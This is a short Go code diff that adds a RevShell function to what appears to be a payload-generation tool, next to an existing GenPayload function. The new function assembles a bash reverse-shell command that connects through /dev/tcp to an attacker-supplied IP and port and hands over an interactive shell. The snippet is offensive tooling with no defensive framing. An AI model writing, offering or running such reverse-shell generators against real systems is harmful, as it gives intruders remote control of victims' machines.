@@ -8,3 +8,12 @@ func GenPayload(payloadtype, command string) string {
 	}
 	return ""
 }
+
+func RevShell(Ip, Port, Type string) string {
+	if Type == "bash" {
+		data := "bash -i >& /dev/tcp/" + Ip + "/" + Port + " 0>&1"
+		return data
+	}
+
+	return ""
+}
